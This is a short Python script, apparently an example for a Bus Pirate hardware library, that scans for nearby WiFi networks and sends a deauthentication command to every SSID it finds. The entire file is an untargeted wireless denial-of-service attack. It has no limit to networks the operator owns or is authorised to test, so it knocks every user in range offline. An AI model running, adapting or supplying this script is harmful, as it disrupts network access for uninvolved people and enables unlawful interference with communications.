# 
# Scan and send deauth to all WiFi networks found
#

from bus_pirate.bus_pirate import BusPirate
from bus_pirate.helper import Helper

# Search and connect to the Bus Pirate
bp = BusPirate.auto_connect()

# Initialize the Bus Pirate
bp.start()

# Change to WiFi mode
bp.change_mode("wifi")

# Scan WiFi networks and get results
bp.send("scan")
print("Scanning WiFi networks, it may take few seconds...")
bp.wait(10)

# Extract SSIDs from results
results = bp.receive(skip=2) # Skip the first two lines (echo and header)
ssids = Helper.extractSsidsFromList(results)
print("Found SSIDs: ", ssids)

# Deauth each SSID
for ssid in ssids:
    bp.send(f"deauth {ssid}")
    bp.wait(3)
    response = bp.receive_all(3)
    for line in response:
        print(" - " + line)

# Close the connection
bp.stop()
